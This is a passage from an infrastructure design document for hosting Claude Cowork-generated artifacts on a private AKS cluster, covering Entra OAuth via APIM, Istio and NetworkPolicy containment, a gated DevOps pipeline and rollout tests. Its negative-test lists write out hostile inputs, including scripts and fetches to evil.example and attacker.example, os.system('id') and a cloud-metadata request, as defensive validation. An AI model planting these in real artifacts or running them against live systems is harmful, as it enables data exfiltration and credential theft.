ztunnel enforces L4 policy on the receiving side only. Plaintext from a non-mesh pod carries no principal, so this policy rejects it at every mesh workload. It also rejects every other non-mesh client in the cluster, which is the point. ztunnel does **not** support `action: AUDIT` or dry-run for L4 policy (Istio documents AUDIT and CUSTOM as waypoint-only), so there is no audit-first mode: roll it out as a canary, first scoped to `artifacts-static` with the workload selector, watch for denied callers for a week, then apply the root policy. Egress deny-all for artifact pods is NetworkPolicy's job, not Istio's: ambient has no client-side AuthorizationPolicy.

### 6.9 What ships to Cowork, and what does not

| Lives in your Cowork skills repo | Lives in Azure / AKS |
|---|---|
| `publish-to-aks/` (SKILL.md, reference, scripts) | APIM (API, MCP server, policies), App Gateway route, Entra app registrations |
| nothing else | intake-api, scanner worker, static gateway, viewer shell, python-runtime, deploy manifests, `artifactctl`, and in Azure DevOps: the two pipelines, the Environment with its approval check, the AKS and Sonar service connections you already have |

Plus one custom connector, added once by a Claude org Owner. Two channels, two auth stories, because the Cowork sandbox has no identity:

| Channel | Who calls | Auth | Notes |
|---|---|---|---|
| A. Tool calls | Anthropic's connector service → App Gateway → APIM → intake-api | Entra OAuth, user-delegated, validated by APIM on every call and verified again by intake-api from the forwarded bearer | Token held server-side by Anthropic. Never enters the sandbox. intake-api reads the user's `oid` and `upn` from the token's claims; nothing between APIM and intake-api carries a secret. |
| B. Upload + finalize | `upload.sh` in the Cowork sandbox → App Gateway → APIM → intake-api | One-time job-bound bearer token minted in channel A | Entra is impossible here: no identity in the sandbox. The token is a capability: 10 min, single use, size-capped, one job. |

Both endpoints must be **reachable from outside your network**. "Internal-only" applies to viewing, not to the publish path. Claude also rejects connector hostnames that resolve to private IPs, so `mcp.corp.com` needs a public DNS record pointing at the App Gateway.

### 6.10 Entra ID through APIM, exactly

**What Entra can and cannot do.** Entra does not implement dynamic client registration (RFC 7591) and does not advertise Client ID Metadata Documents. Claude's connector dialog offers three options; the only one that works with Entra as the authorization server is **"Use your own OAuth client"** with a pre-registered client ID. The alternative, an APIM-hosted OAuth facade that fakes a registration endpoint and federates to Entra, exists as an Azure sample marked experimental. Not for this.

**Entra app registrations (two)**
1. `artifacts-mcp` (the resource). Application ID URI **exactly** `https://mcp.corp.com/artifacts-mcp/mcp`, which must equal the URL you type into the connector dialog (watch trailing slashes). A URL-style Application ID URI is only accepted when its host is under a **verified domain** of the tenant; verify `corp.com` (or whichever domain carries the MCP hostname) before running the script. Expose scope `artifacts.publish`. Manifest `requestedAccessTokenVersion: 2`. A mismatch fails the token request with `AADSTS9010010`.
2. `claude-connector` (the client). Public client, no secret, redirect URI **exactly** `https://claude.ai/api/mcp/auth_callback`, API permission `artifacts-mcp / artifacts.publish`, admin consent granted. Restrict assignment to the users or group allowed to publish.

**Connector dialog.** URL `https://mcp.corp.com/artifacts-mcp/mcp`, authentication "Use your own OAuth client", client ID of `claude-connector`, no secret. You cannot change the auth settings after adding; delete and re-add if wrong.

**Discovery flow.** Claude calls the MCP URL unauthenticated → APIM returns `401` with `WWW-Authenticate: Bearer resource_metadata="https://mcp.corp.com/.well-known/oauth-protected-resource/artifacts-mcp/mcp"` → Claude fetches that document → reads the first entry of `authorization_servers` → fetches Entra's `openid-configuration` (accepted in place of RFC 8414) → PKCE S256 authorization code flow with the user's browser → token → tool calls with `Authorization: Bearer`.

Protected Resource Metadata document, served by an APIM operation with a `return-response` policy:
```json
{
  "resource": "https://mcp.corp.com/artifacts-mcp/mcp",
  "authorization_servers": ["https://login.microsoftonline.com/<tenant-id>/v2.0"],
  "scopes_supported": ["https://mcp.corp.com/artifacts-mcp/mcp/artifacts.publish"],
  "bearer_methods_supported": ["header"]
}
```

APIM policy at MCP-server scope:
```xml
<policies>
  <inbound>
    <base />
    <rate-limit-by-key calls="60" renewal-period="60" counter-key="@(context.Request.IpAddress)" />
    <validate-azure-ad-token tenant-id="{{tenant-id}}" failed-validation-httpcode="401" failed-validation-error-message="Unauthorized" output-token-variable-name="jwt">
      <audiences>
        <audience>{{artifacts-mcp-client-id}}</audience>
      </audiences>
      <client-application-ids>
        <application-id>{{claude-connector-client-id}}</application-id>
      </client-application-ids>
      <required-claims>
        <claim name="scp" match="any">
          <value>artifacts.publish</value>
        </claim>
      </required-claims>
    </validate-azure-ad-token>
    <set-header name="X-Publisher-Oid" exists-action="override">
      <value>@(((Jwt)context.Variables["jwt"]).Claims.GetValueOrDefault("oid", ""))</value>
    </set-header>
    <set-header name="X-Publisher-Upn" exists-action="override">
      <value>@(((Jwt)context.Variables["jwt"]).Claims.GetValueOrDefault("preferred_username", ""))</value>
    </set-header>
  </inbound>
  <backend><base /></backend>
  <outbound><base /></outbound>
  <on-error>
    <base />
    <choose>
      <when condition="@(context.Response.StatusCode == 401)">
        <set-header name="WWW-Authenticate" exists-action="override">
          <value>Bearer resource_metadata="https://mcp.corp.com/.well-known/oauth-protected-resource/artifacts-mcp/mcp"</value>
        </set-header>
      </when>
    </choose>
  </on-error>
</policies>
```
`{{…}}` are APIM named values. Notes from the APIM MCP docs: never read `context.Response.Body` in MCP-server policies; set "number of payload bytes to log" to 0 at global scope; the external MCP server mode needs protocol 2025-06-18 or later, which does not apply here because APIM *is* the MCP server. APIM tiers with MCP support: Developer, Basic, Basic v2, Standard, Standard v2, Premium, Premium v2. Not Consumption.

**Network path.** Anthropic's outbound MCP calls come from `160.79.104.0/21`, IPv4 only, documented as stable. If your APIM is internal-mode, Microsoft's pattern is an internet-facing Application Gateway WAF_v2 exposing only the routes you choose; add a WAF custom rule allowing `/artifacts-mcp/*` from that range only. If your APIM is external-mode, an `ip-filter` policy at MCP-server scope does the same. Do **not** apply the Anthropic range to the upload route: the Cowork sandbox's egress address is not documented, and the one-time token is that route's authentication. Behind App Gateway, APIM's `context.Request.IpAddress` is the gateway's address; use the WAF rule or `X-Forwarded-For` for IP decisions.

The upload and finalize operations are on the same API but outside the MCP server. Policy: no Entra validation, 32 MiB request cap, rate limit by token, forward as-is. intake-api validates the one-time token.

### 6.11 Private-cluster plumbing
- All images from JFrog over your private link. Azure Policy allowed-registries regex includes `jfrog.corp.com` and, if used, `<acr>.azurecr.io`.
- Blob, Key Vault: private endpoints. intake-api, scanner, static-gateway use Workload Identity. Artifact pods use nothing.
- Scanner image: gitleaks binary plus your own `checks.ts` and `imports.py`. No signature databases to mirror.
- Defender for Storage: enable the plan with on-upload malware scanning on the artifact storage account; register the `Microsoft.EventGrid` provider; set the monthly scan cap to something small (50 GB covers thousands of artifacts); optionally exclude the `serving/` prefix with a scan filter so only intake uploads are billed. The service's `StorageDataScanner` identity is added to the account's network rules automatically, so the private endpoint setup is unaffected. Do not update blob metadata right after upload: Microsoft documents that this can make the on-upload scan fail; set any metadata in the upload call itself.
- APIM backend: intake-api via the internal Gateway or a private `HTTPRoute` host `intake.artifacts.internal` with APIM's VNet integration. mTLS between APIM and the Gateway is optional in v1.
- Wildcard certificate for `*.corp-artifacts.net` from your internal CA (or public CA if you prefer, since the domain is yours) stored in Key Vault, synced by the Secrets Store CSI add-on with `secretObjects` of type `kubernetes.io/tls`.

### 6.12 Azure DevOps: the Python deploy pipeline

Prerequisite to confirm: the agents that run this pipeline can reach the private cluster's API server and the private Blob endpoint. Microsoft-hosted agents cannot. You already deploy to this cluster from Azure DevOps, so you have self-hosted agents or a Managed DevOps Pool in the VNet; the pipeline runs on that pool.

How the worker triggers it: `POST https://dev.azure.com/<org>/<project>/_apis/pipelines/<id>/runs?api-version=7.1` with `templateParameters: { jobId }`, authenticated with an Entra access token for the Azure DevOps resource obtained through the worker's workload identity (grant that identity the Queue builds permission on this one pipeline). No PAT anywhere. The pipeline reads everything else it needs (`artifactId`, `expiresAt`, entrypoint, tier) from the job record `jobs/<jobId>.json` through the storage service connection; `jobId` is the only parameter. Callbacks go to the contract path `${INTAKE_EVENTS_URL}/v1/publish/<jobId>/events`.

```yaml
# pipelines/artifact-python-deploy.yml  (outline; real file in the pipeline repo)
parameters:
  - name: jobId
    type: string
trigger: none
pool: { name: <your-vnet-pool> }
stages:
  - stage: Fetch
    jobs:
      - job: fetch
        steps:
          - task: AzureCLI@2
            inputs:
              azureSubscription: <storage-connection>
              scriptType: bash
              scriptLocation: inlineScript
              inlineScript: az storage blob download --auth-mode login --account-name <acct> -c intake -n ${{ parameters.jobId }}.zip -f bundle.zip && unzip -q bundle.zip -d bundle
          - script: gitleaks detect --source bundle --config $(Build.SourcesDirectory)/.gitleaks.toml --exit-code 1
          - task: SonarQubePrepare@7
          - task: SonarQubeAnalyze@7
          - publish: bundle
            artifact: bundle
  - stage: Deploy
    dependsOn: Fetch
    jobs:
      - deployment: deploy
        environment: artifacts-dynamic
        strategy:
          runOnce:
            deploy:
              steps:
                - download: current
                  artifact: bundle
                - script: ./render.sh ${{ parameters.jobId }} bundle/app.py > manifests.yaml
                - task: KubernetesManifest@1
                  inputs:
                    action: deploy
                    kubernetesServiceConnection: <aks-connection>
                    namespace: artifacts-dynamic
                    manifests: manifests.yaml
                - script: >-
                    curl -fsS -X POST "$(INTAKE_EVENTS_URL)/v1/publish/${{ parameters.jobId }}/events"
                    -H "Authorization: Bearer $(PIPELINE_TOKEN)" -H "Content-Type: application/json"
                    -d '{"state":"live"}'
```
The Environment `artifacts-dynamic` carries the approval check (Entra group `artifacts-approvers`, timeout 7 days); it is configured on the Environment, not in YAML. Your policy template already injects gitleaks; the explicit step above shows where it lands. Sonar is advisory: no quality-gate break, the report link is what the approver reads. Callbacks: the Fetch stage posts `awaiting_approval` with the run URL; an `always()` job posts `failed` or `rejected` when a stage fails or the approval is declined. `render.sh` fills the §6.6 template from the pipeline repo.

`artifact-gc.yml`: scheduled nightly, same pool and AKS service connection, `kubectl delete` of every object in `artifacts-dynamic` whose `artifacts.corp.com/expires-at` label is in the past, then `az storage blob delete-batch` on the expired `serving/<id>/` prefixes that intake-api lists.

---

## 7. Alternatives considered

| Option | Strengths | Why not preferred |
|---|---|---|
| AKS Pod Sandboxing (Kata) for the Python tier | VM boundary; Microsoft-shipped, one node-pool flag; GA | Rejected by you. Also unsupported with Istio ambient today (Kata support is an unmerged experimental Istio PR). If you ever enable it, keep those pods out of the mesh, as this design already does. |
| One image per Python artifact (ACR Tasks, Trivy, cosign, Kyverno) | Each app pinned and scanned as a unit; arbitrary dependencies | Needs a builder (ACR Tasks cannot reach a private JFrog; in-cluster builders are third-party), a signer and a verifier. Without VM isolation it adds little containment. Curated runtime removes all of it. |
| Semgrep for stages 4 and 5 | Deeper analysis, maintained rule packs | Third-party; rule packs fetch from the internet by default. `checks.ts` plus `ast` is adequate when CSP and the runtime constraints are the wall. Revisit in Phase 3. |
| Azure Pipelines + Microsoft Security DevOps for scanning | All Microsoft; GHAzDO secret scanning and CodeQL | Asynchronous, 1 to 3 min slower, bundle bounces through a repo. Choose it if gitleaks is also out. |
| APIM OAuth facade with dynamic client registration | Lets Claude use "Register automatically" | Azure sample is marked experimental, uses Cosmos DB and SSE. Pre-registered client works today. |
| AKS Istio add-on (sidecar) or AKS Application Network (ambient) | Microsoft-managed mesh | Add-on has no ambient mode. Application Network is preview, no private clusters, not for production. You already run upstream ambient. |
| Scan-only, no runtime constraints for Python | Simpler cluster | A scanner miss is code on your cluster with a path to everything. |
| Base64 artifact inside the MCP tool argument | Zero extra plumbing | Bytes transit the model context. Fallback only, 1 MiB cap. |
| intake-api applies manifests directly with Kubernetes RBAC | Seconds instead of minutes; one fewer system | Violates "all deployments through Azure DevOps"; gives an internet-reachable service the power to create workloads; loses the audit trail and approval UI your org already uses |
| Entra sign-in via `ext_authz` at the Gateway (oauth2-proxy) | Centralised | Third-party proxy; Entra refuses to be framed, so auth must happen on the shell anyway. MSAL in the shell is ~40 lines. |

---

## 8. Phased plan with gates

**Phase 0: prove the connector path (1 day).**
- Entra: create both app registrations (§6.10). Assign yourself to `claude-connector`.
- APIM: import a stub OpenAPI with `beginPublish` and `getPublishStatus` returning mocks; create the MCP server over them; add the PRM operation and the MCP-scope policy.
- App Gateway (or `ip-filter`): expose `mcp.corp.com/artifacts-mcp/*` and `/artifacts/v1/*/upload`, `/finalize`. Public DNS for `mcp.corp.com`.
- Claude: Owner adds the connector with "Use your own OAuth client". Sign in. In a Cowork task, ask it to call `getPublishStatus` with a fake id.
- Cowork egress: add `mcp.corp.com`. Upload the skill. In a Cowork task, run `upload.sh` against the mock upload endpoint.
- **Gate:** APIM logs show a tool call with your `oid` in `X-Publisher-Oid`, and a sandbox `PUT` returned `201` through APIM. Nothing else proceeds until both are green. If the `PUT` is blocked, decide between changing the egress mode and the base64 fallback.

**Phase 1: static tier end to end (3 days).**
- intake-api, scanner Job (stages 1, 2, 4, 6), Defender for Storage on the artifact account (stage 3), Blob private endpoint, static-gateway with Blob CSI, viewer-shell with MSAL, internal Gateway with both listeners and Key Vault certs, HTTPRoutes.
- `artifactctl` first, then wire the skill.
- **Gate, negative tests first, committed as a rerunnable script:**
  0. A ZIP containing the EICAR test file → `rejected` by the Defender result, and a Defender for Cloud alert appears.
  1. Fake AWS key in a comment → `rejected`, finding names the line.
  2. `<script src="https://evil.example/x.js">` → `rejected`.
  3. `<input type="password">` → `rejected`.
  4. `.py` file with `tier: static` → `rejected`.
  5. `fetch("https://attacker.example")` in JS → **`live`**, browser console shows the CSP block. Containment, not detection, is the wall.
  6. `location.href = "https://example.com"` in JS → **`live`**, the frame stays put, console shows the shell's `frame-src` violation.
  7. Open the raw `https://<id>.corp-artifacts.net/` in a tab → 302 to the shell → Entra sign-in → artifact renders in the frame.
  Then positive: a real Cowork-generated dashboard is live at the shell URL in under 30 s with every header from §6.4 present.

**Phase 2: dynamic tier (1 week).**
- `python-runtime` image in your CI, pushed to JFrog, `runtime-manifest.json` and the skill's library reference generated from it.
- Node pool `untrusted`. Azure Policy assignments. NetworkPolicy. Mesh root AuthorizationPolicy in audit first, then enforce.
- Azure DevOps: `artifact-python-deploy` and `artifact-gc` pipelines, Environment `artifacts-dynamic` with the approval check, Queue-builds permission for the worker identity. Scanner worker: trigger call and callback handling.
- **Gate:**
  1. `app.py` with `os.system("id")` → `rejected`.
  2. `import requests` → `rejected` (not in runtime manifest).
  3. A passing Streamlit app that at run time calls `socket.create_connection(("1.1.1.1", 443))` → times out. Then `urllib.request.urlopen("http://169.254.169.254/metadata/instance")` → fails. The wall, proven twice.
  4. `kubectl apply` a pod in `artifacts-dynamic` with `image: docker.io/library/python` → denied by Azure Policy. Same with `privileged: true` → denied by PSA.
  5. Inside a running artifact pod: `ls /var/run/secrets/kubernetes.io` → absent.
  6. A non-mesh pod in `artifacts-dynamic` curling a mesh service → denied by the root AuthorizationPolicy (test with an egress-allowed test pod, since the real ones have no egress).
  7. Decline the approval in Azure DevOps → status shows `rejected` with the run link.
  Then positive: Cowork publishes a Streamlit app, status shows `awaiting_approval` with the pipeline run link, approving in Azure DevOps moves it to `live`, and the GC pipeline removes it after a 10-minute TTL in a test run.

**Phase 3: hardening (ongoing).**
Per-artifact CSP script hashes; per-user quotas; audit log of who published and who viewed what to Log Analytics; Defender for Containers alerts; scale-to-zero (KEDA add-on, Microsoft-managed); a status page listing live artifacts and expiries; a Node runtime line if people ask for it.

**Non-negotiable gates:** Phase 0 both channels, Phase 1 tests 5 and 6, Phase 2 test 3. If any fails, the design is wrong, not the implementation.

---

## 9. Things that will bite you

| Failure mode | Symptom | Fix |
|---|---|---|
| Application ID URI ≠ connector URL | `AADSTS9010010` during the connector sign-in | Make them byte-identical, including path and no trailing slash |
| PRM `resource` ≠ URL as typed | Claude refuses the connector at discovery | Same string in the dialog, the PRM, and the Entra app |
| Changed your mind on auth | Settings are locked after adding | Delete the connector and re-add |
| `mcp.corp.com` resolves privately | Claude rejects the hostname | Public DNS record for the App Gateway only; everything else stays private |
| Cowork egress "package managers only" | `upload.sh` gets a proxy error; the model is tempted to inline the bytes | Allowlist `mcp.corp.com`; `upload.sh` prints `NETWORK_BLOCKED` and the skill tells the model to stop |
| APIM behind App Gateway | `ip-filter` sees the gateway's IP | IP decisions in the WAF custom rule or on `X-Forwarded-For` |
| APIM MCP policy reads the response body | Tool calls hang or corrupt | Never touch `context.Response.Body` at MCP scope; payload logging 0 |
| Azure Policy sync delay | A bad pod gets through right after assignment | Wait up to 20 min, then run the Phase 2 negative tests |
| Mesh root `ALLOW principals` policy | Some unrelated non-mesh client in the cluster breaks | Run it in audit (`action: AUDIT` duplicate) for a week before enforcing |
| ConfigMap 1 MiB | Large Python artifact rejected | Correct for v1; init-container fetch from Blob is the Phase 3 path |
| Blob CSI attribute cache | Republished static artifact serves stale content | Short attribute and entry timeouts, or new `<id>` per publish with a stable alias |
| `'unsafe-inline'` | Injected inline script in an artifact also runs | Expected in v1; Phase 3 hashes close it |
| Session cookie set with `SameSite=Strict` or `Lax` | Every artifact 403s inside the shell frame on the second request | Cross-site by design; `SameSite=None; Partitioned` (found by the serve agent's review, 2026-10-14) |
| Defender scan latency varies | A publish waits longer than expected on stage 3 | Microsoft gives no SLA; small files scan in seconds. Overlap with the Job, 60 s timeout, timeout routes to human review rather than allow or reject |
| Metadata set right after upload | Defender marks the scan `Error` or `Not scanned` | Set metadata in the upload call; never a second call |
| Index tag trusted as the gate | A principal with tag-write permission could forge `No threats found` | POC only; production consumes Event Grid via Service Bus, and only intake-api and the scanner identity can write tags |
| Upstream ambient on Azure CNI powered by Cilium | Pods not captured, or ztunnel redirection flaky | Already installed by you, so already working; keep Istio and Cilium versions pinned together and re-test after upgrades |
| Microsoft-hosted agent on the pipeline | Deploy stage cannot reach the private API server or Blob | Pin the pipeline to your VNet pool |
| Approval check timeout left at the default | Stale runs sit for 30 days | Set the Environment check timeout to 7 days; the callback marks the job `expired` |
| Pipeline queue latency | A Python publish takes 2 to 3 minutes to reach `awaiting_approval` | Expected; the human wait dominates. Static artifacts are unaffected |
| intake-api trusts `X-Publisher-*` headers from anything that reaches it | A caller inside the VNet that can reach the Gateway's `intake` listener publishes as any user by setting two headers | intake-api verifies the forwarded Entra bearer itself (signature against the tenant JWKS, issuer, audience, expiry) and derives oid/upn from the claims; headers are ignored. No shared key, no extra secret: the user's decision. APIM stays the authorization point. NetworkPolicy on `artifacts-system` admits intake traffic only from the Gateway, worker and shell pods (T18) |
| TTL deletes a demo mid-meeting | "The link died" | TTL is explicit in the manifest and in the `live` response; add `artifactctl extend` |
| Phishing page passes every scan | A colleague types a password into it | Password inputs are rejected; forms cannot post anywhere; the shell shows a persistent "AI-generated artifact, never enter credentials" banner above the frame |

---

## 10. Blast-radius summary

| Component | If compromised, the attacker controls | Therefore |
|---|---|---|
| intake-api | Can submit bundles, read status, and mint view tokens. Cannot create workloads. | Repo behind branch protection; identity scoped to two Blob containers and one queue; no Kubernetes permissions |
| scanner worker | What gets copied into `serving/` and which pipeline runs get queued | Same repo; identity: Blob, queue, and Queue-builds on one pipeline. It cannot approve and cannot apply manifests |
| Azure DevOps pipeline and the AKS service connection | What runs in `artifacts-dynamic` | Your existing pipeline governance: branch policies on the pipeline repo, the Environment approval check, service-connection scoping to the `artifacts-dynamic` namespace |
| `policy.ts`, `checks.ts`, Azure Policy assignments | The gate itself | CODEOWNERS; changes by PR only |
| The skill repo | What Cowork submits | The pipeline never trusts the manifest; it verifies content |
| A static artifact | The viewer's browser inside a sandboxed, navigation-pinned frame | Nothing on the cluster; nothing on other artifacts' origins |
| A Python artifact | One container on the `untrusted` pool with no network, no token, no storage | Node compromise requires a container escape; nothing else runs on that pool |
| `claude-connector` app | Ability to publish as assigned users | Assignment-required; Entra sign-in logs; rate limit |

---

## 11. Verified vs assumed (research 2026-10-14 against vendor docs)

| Claim | Status | Source |
|---|---|---|
| Cowork skills use the Agent Skills format; scripts in `scripts/`; `${CLAUDE_SKILL_DIR}`; SKILL.md < 500 lines; loaded from the account, not `~/.claude/skills` | Verified | claude.com/docs/skills/how-to; code.claude.com/docs/en/skills |
| New Cowork tasks run in an Anthropic cloud sandbox behind a mandatory egress proxy since 2026-10-06 (Pro/Max); egress modes off / package managers / specific domains / all | Verified; Pro/Max default mode unconfirmed | support.claude.com 15520349, 14479288, 12111783 |
| Local stdio MCP servers are not available in Cowork; remote custom connectors are; calls originate from Anthropic's servers; tokens never enter the sandbox | Verified | support.claude.com 11175166, 14479288 |
| Connector auth options: OAuth DCR, CIMD, own client, static headers (beta), none; redirect `https://claude.ai/api/mcp/auth_callback`; PKCE S256; 401 + `resource_metadata` discovery; first `authorization_servers` entry only; openid-configuration accepted; auth settings locked after creation; private-IP hostnames rejected | Verified | claude.com/docs/connectors/building/authentication, /custom/remote-mcp, /building/troubleshooting |
| Anthropic outbound range `160.79.104.0/21`, IPv4 only, "will not change without notice" | Verified | platform.claude.com/docs/en/api/ip-addresses |
| Entra has no dynamic client registration; CIMD not documented; MCP guide uses pre-registered clients, PRM to Entra v2, App ID URI = MCP URL, token version 2 | Verified | learn.microsoft.com Entra agent-id secure-mcp-server; M365 DCR note |
| APIM exposes REST operations as an MCP server (tools only), Streamable HTTP, tiers Developer through Premium v2, not Consumption; `validate-azure-ad-token` applies at MCP scope | Verified; GA announcement text unconfirmed, docs carry no preview tag | learn.microsoft.com/azure/api-management/export-rest-mcp-server, secure-mcp-servers |
| APIM internal mode + App Gateway for selective public exposure; `ip-filter` policy | Verified | learn.microsoft.com/azure/api-management/api-management-howto-integrate-internal-vnet-appgateway, ip-filter-policy |
| Anthropic artifact hosting: `*.claudeusercontent.com`, CSP CDN allowlist, fetch only to own origin, 16 MiB, no backend | Verified for Claude Code artifacts; assumed identical for Cowork | code.claude.com/docs/en/artifacts |
| AKS Istio add-on has no ambient mode; AKS Application Network is the ambient offering, preview, no private clusters | Verified | learn.microsoft.com/azure/aks/istio-about; Azure/AKS#3803; learn.microsoft.com/azure/application-network |
| Ambient: L7 policy at the Gateway via `targetRefs`; non-mesh namespaces reachable from the Gateway; L4 policy is server-side only; egress deny is NetworkPolicy's job | Verified | istio.io ambient docs (migrate-policies, add-workloads, l4-policy) |
| Kata + ambient unsupported (open experimental PR) | Verified; moot after your decision | istio/istio#60876 |
| Gateway API wildcard hostnames and TLS Secret refs; Istio 1.31 conformant | Verified | gateway-api spec; istio.io gateway-api task |
| Upstream ambient on Azure CNI powered by Cilium | Unconfirmed in docs; working in your cluster by your report | n/a |
| AKS Pod Sandboxing GA, `kata-vm-isolation` | Verified; not used | learn.microsoft.com/azure/aks/use-pod-sandboxing |
| Azure Policy for AKS restricted initiative, allowed-images definition, up to 20 min sync; PSA on by default | Verified | learn.microsoft.com/azure/aks/use-azure-policy, use-psa |
| Default-deny NetworkPolicy on Azure CNI powered by Cilium without ACNS | Verified | learn.microsoft.com/azure/aks/azure-cni-powered-by-cilium |
| Defender for Storage on-upload scanning: Microsoft Defender Antivirus engine, triggered by `BlobCreated`, scans all file types including ZIP and RAR, up to 50 GB, private endpoints supported, results as index tags (`No threats found` / `Malicious` / `Error` / `Not scanned`), Event Grid, alerts, Log Analytics; tags not tamper-resistant; billed per GB with a monthly cap; no latency SLA; metadata-after-upload can fail the scan | Verified | learn.microsoft.com/azure/defender-for-cloud/on-upload-malware-scanning, introduction-malware-scanning (updated 2026-09) |
| Scope string format Entra expects in `scopes_supported` for a URL-style App ID URI | Assumed `<App ID URI>/<scope>`; Phase 0 confirms | n/a |
| Azure DevOps: Pipelines Runs REST API with `templateParameters`, Environment approval checks with group assignment and timeout, Entra access tokens accepted by the Azure DevOps REST API, `KubernetesManifest@1` with a Kubernetes service connection, Microsoft-hosted agents cannot reach private clusters | Known, long-standing features; **not re-verified against live docs today** | learn.microsoft.com/azure/devops (confirm task versions in Phase 2) |
| Everything in §6 runs | **Not run.** JSON, YAML and XML snippets parse. No live tenant, no real Cowork session, no end-to-end publish yet. | this file |

Calibrated: design ~90 % settled under your constraints, implementation 0 %, confidence the connector path works first time ~70 % (the Entra URI and scope strings are where first attempts fail), confidence the sandbox upload works on your plan ~60 % until Phase 0.
